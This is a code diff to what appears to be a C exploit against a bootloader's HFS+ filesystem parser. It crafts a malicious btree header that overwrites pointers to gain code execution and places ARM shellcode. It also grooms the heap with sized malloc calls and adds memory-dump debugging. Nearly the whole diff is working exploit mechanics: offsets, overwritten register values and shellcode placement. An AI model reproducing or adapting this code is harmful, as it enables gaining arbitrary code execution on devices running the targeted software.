@@ -56,7 +56,7 @@
 
 #define START_OF_BTREE_HEADER   0x44594
 #define START_OF_EXTENTS_BTREE_HEADER (START_OF_BTREE_HEADER + 0x100) /* 0x44694 */
-#define ALIGNED_POINTER_OFFSET (START_OF_EXTENTS_BTREE_HEADER + 0x2C) /* 0x54 is the right one, but we can't insert the shellcode in the btree header due to size constraints */
+#define ALIGNED_POINTER_OFFSET (START_OF_EXTENTS_BTREE_HEADER + 0x54) /* 0x54 is the right one, but we can't insert the shellcode in the btree header due to size constraints */
 #define START_OF_SHELLCODE (ALIGNED_POINTER_OFFSET + 0x48)
 
 void NAKED
@@ -126,6 +126,23 @@ real_fuck3(unsigned int r0, unsigned int r1, unsigned int r2, unsigned int r3)
         fprintf(stderr, "_memalign: sp = 0x%x, r8 = 0x%x\n", sp, r8);
         dumpfile("DUMP_z3");
         flg = 0;
+        
+#if 1
+        eprintf("Printing memory...\n");
+        eprintf("*** MEMORY ***\n");
+        unsigned int i = 0x44730;
+        for (; i < 0x44730 + 0x20 * 4; i += 0x10) {
+            eprintf("[%x] ", (uintptr_t)image + i);
+            unsigned int c = i;
+            for (; c - i < 0x10; c += 4) {
+                eprintf("%02x", ((unsigned char *)image)[c + 0x0]);
+                eprintf("%02x", ((unsigned char *)image)[c + 0x1]);
+                eprintf("%02x", ((unsigned char *)image)[c + 0x2]);
+                eprintf("%02x ", ((unsigned char *)image)[c + 0x3]);
+            }
+            eprintf("\n");
+        }
+#endif
     }
     (void)(r0 && r1 && r2 && r3);
 }
@@ -221,7 +238,7 @@ my_adjust_stack(void)
      
      */
 #if 1
-    CALL(malloc)(0x7C0 - 64); //0xA0300 -> fits HFSInitPartition
+    CALL(malloc)(0x7C0 - 64);
 #elif 0
     void *ptr;
     ptr = CALL(malloc)(2048 - 64);
@@ -362,15 +379,21 @@ my_readp(void *ih, void *buffer, long long offset, int length)
                 PUT_DWORD_BE(buffer, 16, 0x500);            /* BTHeaderRec::rootNode (must be big, but LSB must be zero) */
                 PUT_WORD_LE(buffer, 20, 0);                /* must be zero (see above) */
                 PUT_WORD_LE(buffer, 14, 0);                /* must be zero, to allow r3 to grow */
-                
-                PUT_DWORD_LE(buffer, 78, (uintptr_t)image + ALIGNED_POINTER_OFFSET);            /* *r2 = r4 */
+#if 1
+                PUT_DWORD_LE(buffer, 0x4E, (uintptr_t)image + ALIGNED_POINTER_OFFSET);            /* *r2 = r4 */
                 
                 PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 4 - START_OF_EXTENTS_BTREE_HEADER, (NODE_SIZE + 0x40) >> 6);    /* *(r0 + 4) = r9 */
                 
                 PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 0x40 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + START_OF_SHELLCODE + 1);    /* r10 (code exec) */
                 PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 0x44 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x447FC);    /* r11 -> lr */
-#if !SHELLCODE
-                PUT_WORD_LE(buffer, START_OF_SHELLCODE + 0x0 - START_OF_EXTENTS_BTREE_HEADER, INSNT_ILLEGAL);
+#else
+                PUT_DWORD_LE(buffer, 0x4E, (uintptr_t)image + 0x446E8);
+                PUT_DWORD_LE(buffer, 0x446E8 + 4 - START_OF_EXTENTS_BTREE_HEADER, (NODE_SIZE + 0x40) >> 6);
+                PUT_DWORD_LE(buffer, 0x446E8 + 0x40 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x44730 + 1);
+                PUT_DWORD_LE(buffer, 0x446E8 + 0x44 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x447FC);    /* r11 -> lr */
+#endif
+#if SHELLCODE
+                PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 0x0 - START_OF_EXTENTS_BTREE_HEADER, INSNA_ILLEGAL);
 #else
                 /* SHEELCODE */
                 PUT_DWORD_LE(buffer, START_OF_SHELLCODE +   0 - START_OF_EXTENTS_BTREE_HEADER, INSNW_LDR_SP_PC72);
